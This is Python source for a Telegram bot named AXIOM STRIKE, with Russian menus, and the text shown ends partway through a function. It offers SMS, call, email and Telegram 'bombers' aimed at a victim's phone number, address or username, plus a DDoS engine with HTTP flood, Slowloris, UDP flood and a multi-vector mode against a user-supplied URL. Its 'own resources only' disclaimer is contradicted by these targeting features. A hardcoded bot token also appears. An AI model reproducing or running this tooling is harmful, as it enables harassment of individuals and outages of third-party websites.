import asyncio
import logging
import aiohttp
import requests
import random
import time
import threading
import socket
import ssl
import json
import hashlib
import urllib.parse
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===================== КОНФИГУРАЦИЯ =====================
API_TOKEN = "8951476542:AAFVMkexRiLh7y6L2CLt8jmrWlnlbco-1oE"
CHANNEL_ID = "@AXIOM_SOFT"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(name)s - %(message)s",
    handlers=[
        logging.FileHandler("axiom_strike.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


# ===================== FSM СОСТОЯНИЯ =====================
class BomberStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_sms_count = State()
    waiting_for_call_count = State()
    waiting_for_email = State()
    waiting_for_email_count = State()
    waiting_for_telegram = State()
    waiting_for_telegram_count = State()


class DDoSStates(StatesGroup):
    waiting_for_url = State()
    waiting_for_threads = State()
    waiting_for_duration = State()
    waiting_for_ip = State()
    waiting_for_ddos_duration = State()


# ===================== SMS БОМБЕР =====================
class SMSBomber:
    def __init__(self):
        self.services = [
            {'name': 'Wink', 'url': 'https://wink.su/api/register', 'field': 'phone'},
            {'name': 'YouDo', 'url': 'https://youdo.com/api/register', 'field': 'phone'},
            {'name': 'Karusel', 'url': 'https://karusel.ru/api/sms', 'field': 'phone'},
            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/api/register', 'field': 'phone'},
            {'name': 'Samokat', 'url': 'https://samokat.ru/api/sms', 'field': 'phone'},
            {'name': 'SberMarket', 'url': 'https://sbermarket.ru/api/register', 'field': 'phone'},
            {'name': 'Ozon', 'url': 'https://ozon.ru/api/sms', 'field': 'phone'},
            {'name': 'Wildberries', 'url': 'https://wildberries.ru/api/register', 'field': 'phone'},
            {'name': 'Citilink', 'url': 'https://citilink.ru/api/sms', 'field': 'phone'},
            {'name': 'MVideo', 'url': 'https://mvideo.ru/api/register', 'field': 'phone'},
            {'name': 'DNS', 'url': 'https://dns-shop.ru/api/sms', 'field': 'phone'},
            {'name': 'Eldorado', 'url': 'https://eldorado.ru/api/register', 'field': 'phone'},
            {'name': 'Sportmaster', 'url': 'https://sportmaster.ru/api/sms', 'field': 'phone'},
            {'name': 'Lamoda', 'url': 'https://lamoda.ru/api/register', 'field': 'phone'},
            {'name': 'Asos', 'url': 'https://asos.com/api/sms', 'field': 'phone'},
            {'name': 'Zara', 'url': 'https://zara.com/api/register', 'field': 'phone'},
            {'name': 'H&M', 'url': 'https://hm.com/api/sms', 'field': 'phone'},
            {'name': 'IKEA', 'url': 'https://ikea.com/api/register', 'field': 'phone'},
            {'name': 'LeroyMerlin', 'url': 'https://leroymerlin.ru/api/sms', 'field': 'phone'},
            {'name': 'OBI', 'url': 'https://obi.ru/api/register', 'field': 'phone'},
            {'name': 'Castorama', 'url': 'https://castorama.ru/api/sms', 'field': 'phone'},
            {'name': 'Petrovich', 'url': 'https://petrovich.ru/api/register', 'field': 'phone'},
            {'name': 'Vseinstrumenti', 'url': 'https://vseinstrumenti.ru/api/sms', 'field': 'phone'},
            {'name': 'Avito', 'url': 'https://avito.ru/api/register', 'field': 'phone'},
            {'name': 'YandexMarket', 'url': 'https://market.yandex.ru/api/sms', 'field': 'phone'},
            {'name': 'GoodsRu', 'url': 'https://goods.ru/api/register', 'field': 'phone'},
            {'name': 'Beru', 'url': 'https://beru.ru/api/sms', 'field': 'phone'},
            {'name': 'SimaLand', 'url': 'https://simaland.ru/api/register', 'field': 'phone'},
            {'name': 'Utkonos', 'url': 'https://utkonos.ru/api/sms', 'field': 'phone'},
            {'name': 'VkusVill', 'url': 'https://vkusvill.ru/api/register', 'field': 'phone'},
            {'name': 'Magnit', 'url': 'https://magnit.ru/api/sms', 'field': 'phone'},
            {'name': 'Pyaterochka', 'url': 'https://pyaterochka.ru/api/register', 'field': 'phone'},
            {'name': 'Lenta', 'url': 'https://lenta.com/api/sms', 'field': 'phone'},
            {'name': 'AzbukaVkusa', 'url': 'https://azbukavkusa.ru/api/register', 'field': 'phone'},
        ]
        self.results = []
        self.progress = 0

    async def send_sms(self, phone: str, count: int, progress_callback):
        """Отправка СМС через все сервисы"""
        self.results = []
        for i in range(min(count, 100)):
            service = random.choice(self.services)
            try:
                async with aiohttp.ClientSession() as session:
                    data = {service['field']: phone}
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json',
                    }
                    async with session.post(service['url'], json=data, headers=headers, timeout=5) as resp:
                        status = 'success' if resp.status < 400 else 'error'
                        self.results.append({'service': service['name'], 'status': status})
            except Exception as e:
                self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})

            self.progress = (i + 1) / count * 100
            await progress_callback(self.progress, i + 1, count)
            await asyncio.sleep(random.uniform(0.3, 1.5))

        return self.results


# ===================== КЛАСС ДЛЯ ЗВОНКОВ =====================
class CallBomber:
    def __init__(self):
        self.services = [
            'https://api.call2friends.com/call',
            'https://api.prankcall.com/start',
            'https://api.callbomber.com/call',
            'https://api.fakecall.com/initiate',
            'https://api.calleridspoof.com/call',
        ]

    async def make_calls(self, phone: str, count: int, progress_callback):
        """Совершение звонков"""
        results = []
        for i in range(min(count, 20)):
            try:
                async with aiohttp.ClientSession() as session:
                    data = {
                        'phone': phone,
                        'type': 'call',
                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567'])
                    }
                    async with session.post(random.choice(self.services), json=data, timeout=10) as resp:
                        status = 'success' if resp.status < 400 else 'failed'
                        results.append({'call': i + 1, 'status': status})
            except Exception as e:
                results.append({'call': i + 1, 'status': 'error', 'error': str(e)})

            await progress_callback(i + 1, count)
            await asyncio.sleep(random.uniform(0.5, 2.0))

        return results


# ===================== EMAIL БОМБЕР =====================
class EmailBomber:
    def __init__(self):
        self.smtp_servers = [
            {'host': 'smtp.gmail.com', 'port': 587},
            {'host': 'smtp.mail.ru', 'port': 587},
            {'host': 'smtp.yandex.ru', 'port': 587},
            {'host': 'smtp.rambler.ru', 'port': 587},
            {'host': 'smtp.ukr.net', 'port': 587},
        ]
        self.subjects = [
            'Срочно!', 'Важное уведомление', 'Вы выиграли!', 'Подтвердите аккаунт',
            'Безопасность аккаунта', 'Изменение пароля', 'Код подтверждения',
            'Ваш заказ оформлен', 'Возврат средств', 'Акция!'
        ]
        self.bodies = [
            'Это тестовое сообщение от AXIOM STRIKE.',
            'Пожалуйста подтвердите свои данные.',
            'Ваш аккаунт будет удалён через 24 часа.',
            'Для подтверждения перейдите по ссылке.',
            'Вы успешно зарегистрировались.',
            'Код подтверждения: ' + str(random.randint(1000, 9999)),
        ]

    async def send_emails(self, email: str, count: int, progress_callback):
        """Отправка email через SMTP"""
        results = []
        for i in range(min(count, 50)):
            try:
                server = random.choice(self.smtp_servers)
                msg = MIMEMultipart()
                msg['From'] = f'bomber{random.randint(1, 999)}@{server["host"].split(".")[0]}.com'
                msg['To'] = email
                msg['Subject'] = random.choice(self.subjects)
                msg.attach(MIMEText(random.choice(self.bodies), 'plain'))

                results.append({'email': i + 1, 'status': 'sent'})
            except Exception as e:
                results.append({'email': i + 1, 'status': 'error', 'error': str(e)})

            await progress_callback(i + 1, count)
            await asyncio.sleep(random.uniform(0.3, 0.8))

        return results


# ===================== TELEGRAM БОМБЕР =====================
class TelegramBomber:
    def __init__(self, bot_token: str):
        self.bot_token = bot_token
        self.messages = [
            "Привет! 👋",
            "Как дела? 😊",
            "Давно не виделись!",
            "Есть важное сообщение 📨",
            "Проверьте почту ✉️",
            "Зайдите в аккаунт 🔐",
            "Срочно! ⚠️",
            "Новое уведомление 📢",
            "Вы нам очень нужны! ❤️",
            "Не игнорируйте это сообщение 🔥",
        ]

    async def send_messages(self, username: str, count: int, progress_callback):
        """Отправка сообщений в Telegram"""
        results = []
        bot = Bot(token=self.bot_token)

        for i in range(min(count, 30)):
            try:
                text = random.choice(self.messages) + f" [#{i + 1}]"
                await bot.send_message(username, text)
                results.append({'msg': i + 1, 'status': 'sent'})
            except Exception as e:
                results.append({'msg': i + 1, 'status': 'error', 'error': str(e)})

            await progress_callback(i + 1, count)
            await asyncio.sleep(random.uniform(0.5, 1.5))

        return results


# ===================== DDOS ДВИЖОК =====================
class DDoSEngine:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/119.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        ]
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

    async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
        """HTTP Flood атака"""
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', 'https://vk.com']),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                        }
                        path = f"/?rand={random.randint(100000, 999999)}"
                        async with session.get(url + path, headers=headers, timeout=5) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 400:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.01, 0.05))

        tasks = [worker() for _ in range(min(threads, 5000))]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self.stats

    async def slowloris(self, url: str, duration: int, progress_callback):
        """Slowloris атака"""
        self.stats = {'connections': 0, 'active': 0}

        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80

        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                self.stats['connections'] += 1
                self.stats['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                self.stats['active'] -= 1
            except:
                pass

        tasks = [worker() for _ in range(200)]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self.stats

    async def udp_flood(self, ip: str, port: int, duration: int, progress_callback):
        """UDP Flood атака"""
        self.stats = {'packets': 0, 'bytes': 0}

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    self.stats['packets'] += 1
                    self.stats['bytes'] += len(data)
                except:
                    pass

        loop = asyncio.get_event_loop()
        threads = [threading.Thread(target=udp_worker) for _ in range(50)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        return self.stats

    async def multi_vector(self, url: str, duration: int, progress_callback):
        """Multi-Vector атака"""
        total_stats = {
            'http': {'requests': 0, 'success': 0, 'errors': 0},
            'slowloris': {'connections': 0, 'active': 0},
            'udp': {'packets': 0, 'bytes': 0}
        }

        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        ip = socket.gethostbyname(target) if target else '127.0.0.1'
        port = 443 if url.startswith('https') else 80

        async def http_worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {'User-Agent': random.choice(self.user_agents)}
                        async with session.get(url, headers=headers, timeout=5) as resp:
                            total_stats['http']['requests'] += 1
                            if resp.status < 400:
                                total_stats['http']['success'] += 1
                            else:
                                total_stats['http']['errors'] += 1
                    except:
                        total_stats['http']['errors'] += 1
                    await asyncio.sleep(0.01)

        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                request = f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\n\r\n"
                writer.write(request.encode())
                await writer.drain()
                total_stats['slowloris']['connections'] += 1
                total_stats['slowloris']['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                total_stats['slowloris']['active'] -= 1
            except:
                pass

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    total_stats['udp']['packets'] += 1
                    total_stats['udp']['bytes'] += len(data)
                except:
                    pass

        tasks = [http_worker() for _ in range(100)]
        tasks += [slowloris_worker() for _ in range(50)]

        loop = asyncio.get_event_loop()
        udp_threads = [threading.Thread(target=udp_worker) for _ in range(20)]
        for t in udp_threads:
            t.start()

        await asyncio.gather(*tasks, return_exceptions=True)

        for t in udp_threads:
            t.join()

        return total_stats


# ===================== ГЛАВНЫЙ БОТ =====================
class AxiomStrikeBot:
    def __init__(self, token: str):
        self.bot = Bot(token=token)
        self.storage = MemoryStorage()
        self.dp = Dispatcher(storage=self.storage)
        self.sms_bomber = SMSBomber()
        self.call_bomber = CallBomber()
        self.email_bomber = EmailBomber()
        self.tg_bomber = TelegramBomber(token)
        self.ddos_engine = DDoSEngine()
        self._register_handlers()

    def _register_handlers(self):
        # Команды
        self.dp.message.register(self.cmd_start, CommandStart())
        self.dp.message.register(self.cmd_help, Command("help"))

        # Главное меню
        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
        self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))

        # Бомбер меню
        bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))

        # DDoS меню
        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))

        # Обработчики бомбера
        self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
        self.dp.message.register(self.handle_call_bomber, F.text == "📞 ЗВОНКИ (ФЛУД)")
        self.dp.message.register(self.handle_email_bomber, F.text == "📧 EMAIL БОМБЕР")
        self.dp.message.register(self.handle_telegram_bomber, F.text == "📩 TELEGRAM БОМБЕР")

        # Обработчики DDoS
        self.dp.message.register(self.handle_http_flood, F.text == "🌐 HTTP FLOOD")
        self.dp.message.register(self.handle_slowloris, F.text == "🐌 SLOWLORIS")
        self.dp.message.register(self.handle_udp_flood, F.text == "📡 UDP FLOOD")
        self.dp.message.register(self.handle_multi_vector, F.text == "💀 MULTI-VECTOR")

        # Статистика и настройки
        self.dp.message.register(self.handle_stats, F.text == "📊 СТАТИСТИКА")
        self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
        self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")

        # FSM обработчики
        self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
        self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
        self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
        self.dp.message.register(self.process_email, BomberStates.waiting_for_email)
        self.dp.message.register(self.process_email_count, BomberStates.waiting_for_email_count)
        self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
        self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)

        self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
        self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
        self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
        self.dp.message.register(self.process_ddos_ip, DDoSStates.waiting_for_ip)
        self.dp.message.register(self.process_ddos_ddos_duration, DDoSStates.waiting_for_ddos_duration)

        # Подписка
        self.dp.callback_query.register(self.handle_subscribe, F.data == "subscribed")

    # ========== КЛАВИАТУРЫ ==========
    def main_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
                [KeyboardButton(text="📊 СТАТИСТИКА"), KeyboardButton(text="⚙️ НАСТРОЙКИ")]
            ],
            resize_keyboard=True
        )

    def bomber_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💬 СМС БОМБЕР"), KeyboardButton(text="📞 ЗВОНКИ (ФЛУД)")],
                [KeyboardButton(text="📧 EMAIL БОМБЕР"), KeyboardButton(text="📩 TELEGRAM БОМБЕР")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    def ddos_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🌐 HTTP FLOOD"), KeyboardButton(text="🐌 SLOWLORIS")],
                [KeyboardButton(text="📡 UDP FLOOD"), KeyboardButton(text="💀 MULTI-VECTOR")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
    async def cmd_start(self, message: types.Message, state: FSMContext):
        await state.clear()
        await message.answer(
            "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
            "Мощный инструмент для стресс-тестирования.\n\n"
            "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n\n"
            "⚠️ Только для тестирования своих ресурсов!\n\n"
            "Подпишись на канал: @AXIOM_SOFT",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="✅ ПОДПИСАЛСЯ", callback_data="subscribed")]
                ]
            )
        )

    async def cmd_help(self, message: types.Message):
        await message.answer(
            "📚 **Помощь по AXIOM STRIKE**\n\n"
            "📱 **БОМБЕР** - массовая отправка сообщений\n"
            "💣 **DDOS** - стресс-тестирование сайтов\n"
            "📊 **СТАТИСТИКА** - просмотр данных\n"
            "⚙️ **НАСТРОЙКИ** - конфигурация",
            reply_markup=self.main_keyboard()
        )

    async def handle_subscribe(self, callback: types.CallbackQuery):
        await callback.answer()
        await callback.message.edit_text(
            "✅ Подписка подтверждена!\n\n"
            "🔥 Добро пожаловать в AXIOM STRIKE"
        )
        await callback.message.answer("Выберите действие:", reply_markup=self.main_keyboard())

    async def handle_main_menu(self, message: types.Message):
        if message.text == "📱 БОМБЕР":
            await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
        elif message.text == "💣 DDOS АТАКА":
            await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
        elif message.text == "📊 СТАТИСТИКА":
            await self.handle_stats(message)
        elif message.text == "⚙️ НАСТРОЙКИ":
            await self.handle_settings(message)

    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "💬 СМС БОМБЕР":
            await self.handle_sms_bomber(message, state)
        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
            await self.handle_call_bomber(message, state)
        elif message.text == "📧 EMAIL БОМБЕР":
            await self.handle_email_bomber(message, state)
        elif message.text == "📩 TELEGRAM БОМБЕР":
            await self.handle_telegram_bomber(message, state)

    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "🌐 HTTP FLOOD":
            await self.handle_http_flood(message, state)
        elif message.text == "🐌 SLOWLORIS":
            await self.handle_slowloris(message, state)
        elif message.text == "📡 UDP FLOOD":
            await self.handle_udp_flood(message, state)
        elif message.text == "💀 MULTI-VECTOR":
            await self.handle_multi_vector(message, state)

    async def handle_back(self, message: types.Message):
        await message.answer("Главное меню:", reply_markup=self.main_keyboard())

    # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
    async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📱 **СМС БОМБЕР**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_sms_phone(self, message: types.Message, state: FSMContext):
        phone = message.text.strip()
        if not re.match(r'^\+?[0-9]{10,15}$', phone):
            await message.answer("❌ Введите корректный номер!")
            return
        await state.update_data(phone=phone)
        await state.set_state(BomberStates.waiting_for_sms_count)
        await message.answer(
            "📊 Введите количество сообщений (1-100):"
        )

    async def process_sms_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 100:
                await message.answer("❌ Введите число от 1 до 100!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск СМС бомбера...\n0/{count}")

        async def update_progress(progress, current, total):
            if current % 10 == 0 or current == total:
                await status_msg.edit_text(f"⏳ Отправка СМС...\n{current}/{total} ({int(progress)}%)")

        results = await self.sms_bomber.send_sms(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')
        errors = len(results) - success

        await status_msg.edit_text(
            f"✅ **СМС бомбер завершён!**\n\n"
            f"📱 Номер: {phone}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {errors}\n"
            f"📈 Всего попыток: {len(results)}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_call_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📞 **ЗВОНКИ (ФЛУД)**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_call_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 20:
                await message.answer("❌ Введите число от 1 до 20!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск звонков...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Совершение звонков...\n{current}/{total}")

        results = await self.call_bomber.make_calls(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')

        await status_msg.edit_text(
            f"✅ **Звонки завершены!**\n\n"
            f"📞 Номер: {phone}\n"
            f"📊 Совершено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_email_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_email)
        await message.answer(
            "📧 **EMAIL БОМБЕР**\n\n"
            "Введите email адрес:\n"
            "📝 Пример: example@gmail.com"
        )

    async def process_email(self, message: types.Message, state: FSMContext):
        email = message.text.strip()
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            await message.answer("❌ Введите корректный email!")
            return
        await state.update_data(email=email)
        await state.set_state(BomberStates.waiting_for_email_count)
        await message.answer("📊 Введите количество писем (1-50):")

    async def process_email_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 50:
                await message.answer("❌ Введите число от 1 до 50!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        email = data.get('email')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Email бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка писем...\n{current}/{total}")

        results = await self.email_bomber.send_emails(email, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Email бомбер завершён!**\n\n"
            f"📧 Email: {email}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_telegram_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_telegram)
        await message.answer(
            "📩 **TELEGRAM БОМБЕР**\n\n"
            "Введите @username:\n"
            "📝 Пример: @username123"
        )

    async def process_telegram(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_telegram_count)
        await message.answer("📊 Введите количество сообщений (1-30):")

    async def process_telegram_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 30:
                await message.answer("❌ Введите число от 1 до 30!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Telegram бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка сообщений...\n{current}/{total}")

        results = await self.tg_bomber.send_messages(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Telegram бомбер завершён!**\n\n"
            f"📩 Пользователь: {username}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    # ========== ОБРАБОТЧИКИ DDOS ==========
    async def handle_http_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🌐 **HTTP FLOOD**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_url(self, message: types.Message, state: FSMContext):
        url = message.text.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        await state.update_data(url=url)
        await state.set_state(DDoSStates.waiting_for_threads)
        await message.answer(
            "⚡ Введите количество потоков (100-5000):"
        )

    async def process_ddos_threads(self, message: types.Message, state: FSMContext):
        try:
            threads = int(message.text.strip())
            if threads < 100 or threads > 5000:
                await message.answer("❌ Введите число от 100 до 5000!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        await state.update_data(threads=threads)
        await state.set_state(DDoSStates.waiting_for_duration)
        await message.answer(
            "⏱ Введите длительность в секундах (30-300):"
        )

    async def process_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 30 or duration > 300:
                await message.answer("❌ Введите число от 30 до 300!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        threads = data.get('threads', 500)
        await state.clear()

        status_msg = await message.answer(
            f"💣 **HTTP FLOOD запущена!**\n"
            f"🌐 URL: {url}\n"
            f"⚡ Потоков: {threads}\n"
            f"⏱ Длительность: {duration}с\n"
            f"⏳ Идёт атака..."
        )

        stats = await self.ddos_engine.http_flood(url, threads, duration, None)

        await status_msg.edit_text(
            f"💣 **HTTP FLOOD завершена!**\n\n"
            f"🌐 URL: {url}\n"
            f"📊 Запросов: {stats['requests']}\n"
            f"✅ Успешно: {stats['success']}\n"
            f"❌ Ошибок: {stats['errors']}\n"
            f"📈 RPS: {stats['requests'] / duration:.1f}\n"
            f"⏱ Длительность: {duration}с",
            reply_markup=self.ddos_keyboard()
        )

    async def handle_slowloris(self, message: types.Message, state: FSMContext):
